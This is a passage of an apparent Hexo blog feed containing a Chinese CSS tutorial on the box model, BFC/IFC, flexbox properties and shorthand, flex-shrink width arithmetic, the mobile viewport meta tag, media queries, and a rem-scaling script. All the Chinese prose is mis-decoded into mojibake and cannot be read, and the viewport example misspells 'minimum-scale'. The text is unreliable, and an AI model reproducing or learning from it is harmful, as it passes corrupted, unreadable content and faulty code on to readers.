éƒ½ä¸º0æ—¶ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰çš„å­é¡¹éƒ½ä¸èƒ½ç¼©å°ï¼Œå°±ä¼šå‡ºç°è®¨åŒçš„æ¨ªå‘æ»šåŠ¨æ¡</li><li>æ€»ç»“ä¸Šé¢å››ç‚¹ï¼Œå¯ä»¥çœ‹å‡ºä¸ç®¡åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ï¼Œåœ¨åŒä¸€æ—¶é—´ï¼Œflex-shrink å’Œ flex-grow åªæœ‰ä¸€ä¸ªèƒ½èµ·ä½œç”¨ï¼Œè¿™å…¶ä¸­çš„é“ç†ç»†æƒ³èµ·æ¥ä¹Ÿå¾ˆæµ…æ˜¾ï¼šç©ºé—´è¶³å¤Ÿæ—¶ï¼Œflex-grow å°±æœ‰å‘æŒ¥çš„ä½™åœ°ï¼Œè€Œç©ºé—´ä¸è¶³æ—¶ï¼Œflex-shrink å°±èƒ½èµ·ä½œç”¨ã€‚å½“ç„¶ï¼Œflex-wrap çš„å€¼ä¸º wrap | wrap-reverse æ—¶ï¼Œè¡¨æ˜å¯ä»¥æ¢è¡Œï¼Œæ—¢ç„¶å¯ä»¥æ¢è¡Œï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç©ºé—´å°±æ€»æ˜¯è¶³å¤Ÿçš„ï¼Œflex-shrink å½“ç„¶å°±ä¸ä¼šèµ·ä½œç”¨</li></ol><p><br></p><h4 id="3-5-flexå®½åº¦è®¡ç®—"><a href="#3-5-flexå®½åº¦è®¡ç®—" class="headerlink" title="3.5 flexå®½åº¦è®¡ç®—"></a>3.5 flexå®½åº¦è®¡ç®—</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  * &#123;</span></span><br><span class="line"><span class="undefined">    padding: 0;</span></span><br><span class="line"><span class="undefined">    margin: 0;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 600px;</span></span><br><span class="line"><span class="undefined">    height: 300px;</span></span><br><span class="line"><span class="undefined">    display: flex;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 1 2 500px;</span></span><br><span class="line"><span class="undefined">    background: red;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 2 1 400px;</span></span><br><span class="line"><span class="undefined">    background: blue;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å­å…ƒç´ çš„ flex-shrink çš„å€¼åˆ†åˆ«ä¸º 2ï¼Œ1</span><br><span class="line">æº¢å‡ºï¼š500+400 - 600 = 300ã€‚</span><br><span class="line">æ€»æƒé‡ä¸º 2 * 500+ 1 * 400 = 1400</span><br><span class="line">ä¸¤ä¸ªå…ƒç´ åˆ†åˆ«æ”¶ç¼©ï¼š</span><br><span class="line">300 * 2(flex-shrink) * 500(width) / 1400= 214.28</span><br><span class="line">300 * 1(flex-shrink) * 400(width) / 1400= 85.72</span><br><span class="line">ä¸‰ä¸ªå…ƒç´ çš„æœ€ç»ˆå®½åº¦åˆ†åˆ«ä¸ºï¼š</span><br><span class="line">500 - 214.28 = 285.72</span><br><span class="line">400 - 85.72 = 314.28</span><br></pre></td></tr></table></figure><p>æ”¶ç¼©ï¼šå­é¡¹å®½åº¦ - ç§»é™¤å®½åº¦ <em> å­é¡¹æ”¶ç¼©<strong>æƒé‡æ¯”ä¾‹</strong>ï¼ˆè‡ªèº«å®½åº¦ </em> shrink / æ€»æƒé‡ï¼‰<br>æ‹‰ä¼¸ä¸æ”¶ç¼©ç®—æ³•ä¸ä¸€æ ·ï¼šå­é¡¹å®½åº¦ + å‰©ä½™å®½åº¦ * å­é¡¹æ‹‰ä¼¸æ¯”ä¾‹</p><p><br></p><p><br></p><h3 id="5-ç§»åŠ¨ç«¯é€‚é…"><a href="#5-ç§»åŠ¨ç«¯é€‚é…" class="headerlink" title="5. ç§»åŠ¨ç«¯é€‚é…"></a>5. ç§»åŠ¨ç«¯é€‚é…</h3><h4 id="5-1-meta-viewporté€‚é…"><a href="#5-1-meta-viewporté€‚é…" class="headerlink" title="5.1 meta-viewporté€‚é…"></a>5.1 meta-viewporté€‚é…</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0, minimun-scale=1.0, maximum-scale=1.0, user-scalable=no"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ device-width æ„æ€æ˜¯è®¾å¤‡å®½åº¦</p><ul><li>widthï¼šå±æ€§æ§åˆ¶è§†å£çš„å®½åº¦ï¼Œå¯ä»¥è®¾ç½®å…·ä½“çš„å®½åº¦å¦‚ï¼š<code>width=700</code>ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ä¹ˆä½¿ç”¨ï¼Œéƒ½æ˜¯ä½¿ç”¨ <code>width=device-width</code></li><li>inital-scaleï¼šé¡µé¢åˆå§‹ç¼©æ”¾å€¼ï¼Œé»˜è®¤ä¸º 1ï¼›</li><li>maximum-scaleï¼šå…è®¸ç”¨æˆ·ç¼©æ”¾åˆ°çš„æœ€å¤§æ¯”ä¾‹ã€‚</li><li>minimum-scaleï¼šå…è®¸ç”¨æˆ·ç¼©æ”¾åˆ°çš„æœ€å°æ¯”ä¾‹ã€‚</li><li>user-scalableï¼šç”¨æˆ·æ˜¯å¦å¯ä»¥æ‰‹åŠ¨ç¼©æ”¾ã€‚</li></ul><p>ä¸ºäº†èƒ½åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šæ­£å¸¸æ˜¾ç¤ºé‚£äº›ä¼ ç»Ÿçš„ä¸ºæ¡Œé¢æµè§ˆå™¨è®¾è®¡çš„ç½‘ç«™ï¼Œç§»åŠ¨è®¾å¤‡ä¸Šçš„æµè§ˆå™¨éƒ½ä¼šæŠŠè‡ªå·±é»˜è®¤çš„viewportè®¾ä¸º980pxæˆ–1024pxï¼ˆä¹Ÿå¯èƒ½æ˜¯å…¶å®ƒå€¼ï¼Œè¿™ä¸ªæ˜¯ç”±è®¾å¤‡è‡ªå·±å†³å®šçš„ï¼‰ï¼Œè¿™æ ·åšæ˜¯å› ä¸ºè®¸å¤šé¡µé¢æ²¡æœ‰åšç§»åŠ¨ç«¯ä¼˜åŒ–ï¼Œåœ¨å°çª—å£æ¸²æŸ“æ—¶ä¼šä¹±æ‰ï¼ˆæˆ–çœ‹èµ·æ¥ä¹±ï¼‰ã€‚æ‰€ä»¥ï¼Œè¿™ç§è™šæ‹Ÿè§†å£æ˜¯ä¸€ç§è®©æœªåšç§»åŠ¨ç«¯ä¼˜åŒ–çš„ç½‘ç«™åœ¨çª„å±è®¾å¤‡ä¸Šçœ‹èµ·æ¥æ›´å¥½çš„åŠæ³•ã€‚</p><p><br></p><h4 id="5-2-åª’ä½“æŸ¥è¯¢"><a href="#5-2-åª’ä½“æŸ¥è¯¢" class="headerlink" title="5.2 åª’ä½“æŸ¥è¯¢"></a>5.2 åª’ä½“æŸ¥è¯¢</h4><p><em><code>@media</code></em>æŸ¥è¯¢é’ˆå¯¹ä¸åŒçš„å±å¹•å°ºå¯¸è®¾ç½®ä¸åŒçš„æ ·å¼ï¼Œå½“è¦è®¾ç½®å“åº”å¼é¡µé¢æ—¶ï¼Œè¿˜æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚å½“ä½ é‡ç½®æµè§ˆå™¨å¤§å°çš„è¿‡ç¨‹ä¸­ï¼Œé¡µé¢ä¹Ÿä¼šæ ¹æ®æµè§ˆå™¨çš„å®½åº¦å’Œé«˜åº¦é‡æ–°æ¸²æŸ“é¡µé¢ã€‚</p><p><br></p><h4 id="5-3-em-rem-vw-vh"><a href="#5-3-em-rem-vw-vh" class="headerlink" title="5.3 em, rem, vw, vh"></a>5.3 em, rem, vw, vh</h4><p>emå’Œreméƒ½æ˜¯ç›¸å¯¹å•ä½é•¿åº¦</p><ul><li>emæ˜¯ç›¸å¯¹çˆ¶çº§font-sizeå˜åŒ–çš„ï¼Œå¦‚æœåµŒå¥—è¿‡æ·±ï¼Œè®¡ç®—ä¼šæ¯”è¾ƒç¹çï¼Œå› æ­¤ä¸€èˆ¬å¤§èŒƒå›´ä¸é€‚ç”¨ï¼Œå°èŒƒå›´å¯ç»“åˆpxå•ä½ä½¿ç”¨ã€‚</li><li>remæ˜¯ç›¸å¯¹htmlæ ¹å…ƒç´ font-sizeå˜åŒ–çš„ï¼Œæ²¡æœ‰emçš„ç¹çè®¡ç®—ï¼Œé…åˆåŠ¨æ€è®¡ç®—remçš„jsä»£ç ï¼Œremåœ¨ç§»åŠ¨ç«¯å¸ƒå±€ä¸­å¾ˆå—æ¬¢è¿<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> doc = win.document;</span><br><span class="line"><span class="keyword">var</span> docEl = doc.documentElement;</span><br><span class="line"><span class="keyword">var</span> tid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refreshRem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> width = docEl.getBoundingClientRect().width;        </span><br><span class="line"><span class="keyword">if</span> (width &gt;=<span class="number">750</span>) width = <span class="number">750</span>;</span><br><span class="line"><span class="keyword">if</span>(width&lt;=<span class="number">320</span>) width=<span class="number">320</span>;</span><br><span class="line"><span class="keyword">var</span> rem = width / <span class="number">7.5</span>;</span><br><span class="line">docEl.style.fontSize = rem + <span class="string">'px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">win.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clearTimeout(tid);</span><br><span class="line">tid = setTimeout(refreshRem, <span class="number">300</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">refreshRem();</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6844903591149305864" target="_blank" rel="noopener">Flex æ’ç‰ˆæºç åˆ†æ</a></li><li><a href="https://juejin.cn/post/6844903817503326216" target="_blank" rel="noopener">ç§»åŠ¨ç«¯ä¸‰ç§é€‚é…æ–¹æ¡ˆ</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/2021/08/16/flex/"/>
      <url>/2021/08/16/flex/</url>
      <content type="html"><![CDATA[<hr><p>title: ç›’æ¨¡å‹ã€æ­£å¸¸æµã€flexï¼Œç§»åŠ¨ç«¯é€‚é…<br>date: 2021-08-13 00:16:04</p><h2 id="category-CSS"><a href="#category-CSS" class="headerlink" title="category: CSS"></a>category: CSS</h2><h3 id="1-ç›’æ¨¡å‹"><a href="#1-ç›’æ¨¡å‹" class="headerlink" title="1. ç›’æ¨¡å‹"></a>1. ç›’æ¨¡å‹</h3><p>HTMLæ ‡ç­¾ä¸­å¯ä»¥ä¹¦å†™å¼€å§‹æ ‡ç­¾ã€ç»“æŸæ ‡ç­¾å’Œè‡ªå°é—­æ ‡ç­¾ã€‚ä¸€å¯¹èµ·æ­¢æ ‡ç­¾ï¼Œè¡¨ç¤ºä¸€ä¸ªå…ƒç´ ã€‚DOMæ ‘ä¸­å­˜å‚¨çš„æ˜¯å…ƒç´ å’Œå…¶ä»–ç±»å‹çš„èŠ‚ç‚¹ã€‚CSSé€‰æ‹©å™¨é€‰ä¸­çš„æ˜¯<em>å…ƒç´ </em>ã€‚</p><p>å…ƒç´ åœ¨æ’ç‰ˆæ—¶å¯èƒ½äº§ç”Ÿå¤šä¸ª<em>ç›’</em>ã€‚æ’ç‰ˆå’Œæ¸²æŸ“çš„åŸºæœ¬å•ä½æ˜¯<em>ç›’</em>ã€‚ä¸€ä¸ªå…ƒç´ å¯èƒ½ä¼šäº§ç”Ÿå¤šä¸ªç›’ã€‚å¦‚<em>inline</em>å…ƒç´ å› ä¸ºåˆ†è¡Œè€Œäº§ç”Ÿå¤šä¸ªç›’ã€‚<em>è¢«ä¼ªå…ƒç´ é€‰ä¸­çš„å…ƒç´ </em>ä¹Ÿä¼šäº§ç”Ÿå¤šä¸ªç›’ã€‚</p><p>æ¯ä¸ªå…ƒç´ è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªçŸ©å½¢çš„æ–¹æ¡†ï¼Œæ¡†çš„å†…å®¹ã€å†…è¾¹è·ã€è¾¹ç•Œã€å¤–è¾¹è·ä¸€å±‚å±‚æ„å»ºèµ·æ¥ã€‚æµè§ˆå™¨æ¸²æŸ“ç½‘é¡µå¸ƒå±€æ—¶ï¼Œä¼šç®—å‡ºæ¯ä¸ªæ¡†æ¯ä¸€å±‚è¦ç”¨ä»€ä¹ˆæ ·å¼ï¼Œä»¥åŠæ¡†æ”¾åœ¨å“ªé‡Œã€‚<br><em><code>box-sizing</code></em></p><ul><li>content-boxï¼š<code>element width = border + padding + content width</code></li><li>border-boxï¼š<code>element width = content width</code>(å†…å®¹å®½åº¦åŒ…å«äº†content widthï¼Œborder, padding, å»ºè®®ä½¿ç”¨)</li></ul><p><br></p><h3 id="2-æ­£å¸¸æµï¼ŒBFCï¼ŒIFC"><a href="#2-æ­£å¸¸æµï¼ŒBFCï¼ŒIFC" class="headerlink" title="2. æ­£å¸¸æµï¼ŒBFCï¼ŒIFC"></a>2. æ­£å¸¸æµï¼ŒBFCï¼ŒIFC</h3><p>HTMLæœ€æ—©çš„æ’ç‰ˆè®¾è®¡ï¼Œä»æ–‡å­—å‡ºç‰ˆè¡Œä¸šçš„ä¸“å®¶æ¥åšã€‚æ€è€ƒä¸€ä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•å†™å­—ï¼Ÿ1.ä»å·¦åˆ°å³ä¹¦å†™ï¼› 2. åŒä¸€è¡Œå†™çš„æ–‡å­—éƒ½æ˜¯å¯¹é½çš„ï¼›3. ä¸€è¡Œå†™æ»¡äº†ï¼Œå°±æ¢åˆ°ä¸‹ä¸€è¡Œã€‚<strong>è¿™ä¹Ÿå¯¹åº”äº†æ­£å¸¸æµæ’ç‰ˆè¿‡ç¨‹:</strong></p><ol><li>æ”¶é›†ç›’</li><li>è®¡ç®—ç›’åœ¨è¡Œä¸­çš„æ’å¸ƒ<ul><li>è¡Œå†…ç›’éµå¾ª<em>IFC</em>(inline formatting contexts) å†…è”æ ¼å¼ä¸Šä¸‹æ–‡<br>ä»å·¦åˆ°å³æ’åˆ—ï¼Œæ’ä¸ä¸‹ï¼Œæ”¾ä¸‹ä¸€è¡Œã€‚BaselineåŸºçº¿æ¥å†³å®šè¡Œå†…å…ƒç´ å¦‚ä½•å¯¹é½ã€‚</li><li>å—çŠ¶ç›’éµå¾ª<em>BFC</em>(Block formatting contexts) å—çº§æ ¼å¼ä¸Šä¸‹æ–‡<br>ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ’å¸ƒã€‚BFCåˆå¹¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ<ul><li><em>clear float</em><br>å…¶å®ä¸æ˜¯æ¸…æ¥šæµ®åŠ¨çš„æ„æ€ï¼Œè€Œæ˜¯æ‰¾ä¸€ä¸ªå¹²å‡€çš„ç©ºé—´æ¥æ‰§è¡Œæµ®åŠ¨ã€‚é¿å…å¤šä¸ªç›¸é‚»çš„æµ®åŠ¨å…ƒç´ å †å åœ¨ä¸€è¡Œ</li><li><em>margunæŠ˜å </em><br>åªæ˜¯è¦æ±‚å‘¨å›´æœ‰è¿™ä¹ˆå¤šçš„ç©ºç™½ï¼Œå°±æ˜¯ä¸€ä¸ªåˆç†çš„æ’ç‰ˆã€‚è€Œä¸ä¼šè¯´è·Ÿåˆ«çš„è¾¹è·ä¹Ÿæœ‰è¿™ä¹ˆå¤šç©ºç™½ã€‚åªæœ‰æ­£å¸¸æµçš„BFCä¼šå‘ç”ŸmarginæŠ˜å çš„ç°è±¡ï¼Œå…¶ä»–flexç­‰å¸ƒå±€ä¸ä¼šå‘ç”Ÿã€‚</li></ul></li></ul></li><li>è®¡ç®—è¡Œçš„æ’å¸ƒ</li></ol><p><br></p><h3 id="3-flex"><a href="#3-flex" class="headerlink" title="3. flex"></a>3. flex</h3><p>flex å®¹å™¨ä¸­é»˜è®¤å­˜åœ¨ä¸¤æ¡è½´ï¼š</p><ul><li>æ°´å¹³ä¸»è½´ main axis</li><li>å‚ç›´äº¤å‰è½´ cross axis</li></ul><p><img src="/2021/08/16/flex/1.jpg"><br>åœ¨å®¹å™¨ä¸­çš„æ¯ä¸ªå•å…ƒå—è¢«ç§°ä¹‹ä¸º flex itemï¼Œæ¯ä¸ªé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ä¸º (main size), å æ®çš„äº¤å‰è½´çš„ç©ºé—´ä¸º (cross size)ã€‚ä¸èƒ½å…ˆå…¥ä¸ºä¸»è®¤ä¸ºå®½åº¦å°±æ˜¯ main sizeï¼Œé«˜åº¦å°±æ˜¯ cross sizeï¼Œå–å†³äº<code>flex-direction</code>çš„å–å€¼ï¼‰</p><p><br></p><h4 id="3-1-flex-å®¹å™¨"><a href="#3-1-flex-å®¹å™¨" class="headerlink" title="3.1 flex å®¹å™¨"></a>3.1 flex å®¹å™¨</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex | inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½® flex å¸ƒå±€åï¼Œå­å…ƒç´ çš„ floatã€clearã€vertical-align çš„å±æ€§å°†ä¼šå¤±æ•ˆã€‚</p><p>æœ‰ä¸‹é¢å…­ç§å±æ€§å¯ä»¥è®¾ç½®åœ¨å®¹å™¨ä¸Šï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><ol><li>flex-directionï¼šå†³å®šä¸»è½´çš„æ–¹å‘ row | row-reverse | column | column-reverse</li><li>flex-wrapï¼šå†³å®šå®¹å™¨å†…itemæ˜¯å¦å¯æ¢è¡Œ nowrap(ä¸æ¢è¡Œ) | wrap | wrap-reverse(æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸‹æ–¹)</li><li>flex-flowï¼šflex-direction å’Œ flex-wrap çš„ç®€å†™å½¢å¼ï¼Œé»˜è®¤å€¼ä¸º: row nowrap</li><li>justify-contentï¼šitemåœ¨ä¸»è½´çš„å¯¹é½æ–¹å¼ flex-start | flex-end | center | space-between | space-around</li><li>align-itemsï¼šitemåœ¨äº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ï¼Œé»˜è®¤å€¼ä¸º stretchï¼Œå³å¦‚æœé¡¹ç›®æœªè®¾ç½®é«˜åº¦æˆ–è€…è®¾ä¸º autoï¼Œå°†å æ»¡æ•´ä¸ªå®¹å™¨çš„é«˜åº¦ã€‚flex-start | flex-end | center | baseline(é¡¹ç›®çš„ç¬¬ä¸€è¡Œæ–‡å­—çš„åŸºçº¿å¯¹é½) | stretch</li><li>align-contentï¼šç¡®å®šå®¹å™¨ä¸­å­˜åœ¨å¤šè¡Œæƒ…å†µä¸‹ï¼Œåœ¨äº¤å‰è½´ä¸Šï¼Œè¡Œé—´å¯¹é½æ–¹å¼ã€‚é»˜è®¤å€¼ä¸º stretchï¼Œå¦‚æœé¡¹ç›®åªæœ‰ä¸€æ ¹è½´çº¿ï¼Œé‚£ä¹ˆè¯¥å±æ€§å°†ä¸èµ·ä½œç”¨ flex-start | flex-end | center | space-between | space-around | stretch<ul><li>å½“ flex-wrap è®¾ç½®ä¸º nowrap çš„æ—¶å€™ï¼Œå®¹å™¨ä»…å­˜åœ¨ä¸€æ ¹è½´çº¿ï¼Œå› ä¸ºé¡¹ç›®ä¸ä¼šæ¢è¡Œï¼Œå°±ä¸ä¼šäº§ç”Ÿå¤šæ¡è½´çº¿ã€‚</li><li>å½“ flex-wrap è®¾ç½®ä¸º wrap çš„æ—¶å€™ï¼Œå®¹å™¨å¯èƒ½ä¼šå‡ºç°å¤šæ¡è½´çº¿ï¼Œè¿™æ—¶å€™ä½ å°±éœ€è¦å»è®¾ç½®å¤šæ¡è½´çº¿ä¹‹é—´çš„å¯¹é½æ–¹å¼äº†ã€‚</li></ul></li></ol><p><br></p><h4 id="3-2-flex-itemå±æ€§"><a href="#3-2-flex-itemå±æ€§" class="headerlink" title="3.2 flex itemå±æ€§"></a>3.2 flex itemå±æ€§</h4><p>æœ‰å…­ç§å±æ€§å¯è¿ç”¨åœ¨ item é¡¹ç›®ä¸Šï¼š</p><ol><li>orderï¼šé¡¹ç›®åœ¨å®¹å™¨ä¸­çš„æ’åˆ—é¡ºåºï¼Œæ•°å€¼è¶Šå°ï¼Œæ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œå¯ä¸ºè´Ÿæ•°</li><li>flex-basisï¼šåœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹å‰ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±æ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ï¼Œé»˜è®¤ä¸º autoï¼Œå³é¡¹ç›®æœ¬æ¥çš„å¤§å°, è¿™æ—¶å€™ item çš„å®½é«˜å–å†³äº width æˆ– height çš„å€¼ã€‚<ul><li>å½“ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘çš„æ—¶å€™ï¼Œå½“è®¾ç½®äº† flex-basisï¼Œé¡¹ç›®çš„å®½åº¦è®¾ç½®å€¼ä¼šå¤±æ•ˆï¼Œflex-basis éœ€è¦è·Ÿ flex-grow å’Œ flex-shrink é…åˆä½¿ç”¨æ‰èƒ½å‘æŒ¥æ•ˆæœã€‚</li></ul></li><li>flex-growï¼šé¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œå³å¦‚æœå­˜åœ¨å‰©ä½™ç©ºé—´ï¼Œä¹Ÿä¸æ”¾å¤§ã€‚<br>å½“æ‰€æœ‰çš„é¡¹ç›®éƒ½ä»¥ flex-basis çš„å€¼è¿›è¡Œæ’åˆ—åï¼Œä»æœ‰å‰©ä½™ç©ºé—´ï¼Œé‚£ä¹ˆè¿™æ—¶å€™ flex-grow å°±ä¼šå‘æŒ¥ä½œç”¨äº†ã€‚</li><li>flex-shrinkï¼šé¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤å€¼ä¸º 1ï¼Œå³å¦‚æœç©ºé—´ä¸è¶³ï¼Œè¯¥é¡¹ç›®å°†ç¼©å°ï¼Œè´Ÿå€¼å¯¹è¯¥å±æ€§æ— æ•ˆã€‚</li><li>flexï¼šflex-grow, flex-shrink å’Œ flex-basis çš„ç®€å†™ï¼Œé»˜è®¤å€¼æ˜¯ 0 1 autoã€‚<br>æœ‰å…³å¿«æ·å€¼ï¼šauto (1 1 auto) å’Œ none (0 0 auto)</li><li>align-selfï¼šå…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸å…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œé»˜è®¤å€¼ä¸º autoï¼Œè¡¨ç¤ºç»§æ‰¿çˆ¶å…ƒç´ çš„ align-items å±æ€§ï¼Œå¦‚æœæ²¡æœ‰çˆ¶å…ƒç´ ï¼Œåˆ™ç­‰åŒäº stretchã€‚auto | flex-start | flex-end | center | baseline | stretch</li></ol><p><br></p><h4 id="3-3-flex-ç®€å†™"><a href="#3-3-flex-ç®€å†™" class="headerlink" title="3.3 flex ç®€å†™"></a>3.3 flex ç®€å†™</h4><p><em>å…¬å¼ï¼š</em></p><ul><li>x éè´Ÿæ—¶ï¼Œflex: x â†’ flex: x 1 0%</li><li>x ä¸ºé•¿åº¦(px)æˆ–ç™¾åˆ†æ¯”æ—¶ï¼Œflex: x â†’ flex: 1 1 x</li><li>x å’Œ y éƒ½éè´Ÿæ—¶ï¼Œflex: x y â†’ flex: x y 0%</li><li>x éè´Ÿæ•°å­—ã€y æ˜¯ä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”æ—¶ï¼Œflex: x y â†’ flex: x 1 y</li></ul><p><em>ä¸¾ä¾‹ï¼š</em><br>å½“ flex å–å€¼ä¸ºä¸€ä¸ªéè´Ÿæ•°å­—ï¼Œåˆ™è¯¥æ•°å­—ä¸º flex-grow å€¼ï¼Œflex-shrink å– 1ï¼Œflex-basis å– 0%ï¼Œå¦‚ä¸‹æ˜¯ç­‰åŒçš„ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">1</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸º 0 æ—¶ï¼Œå¯¹åº”çš„ä¸‰ä¸ªå€¼åˆ†åˆ«ä¸º 0 1 0%ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;<span class="attribute">flex</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">flex-basis</span>: <span class="number">0%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ flex å–å€¼ä¸ºä¸€ä¸ªé•¿åº¦æˆ–ç™¾åˆ†æ¯”ï¼Œåˆ™è§†ä¸º flex-basis å€¼ï¼Œflex-grow å– 1ï¼Œflex-shrink å– 1ï¼Œæœ‰å¦‚ä¸‹ç­‰åŒæƒ…å†µï¼ˆæ³¨æ„ 0% 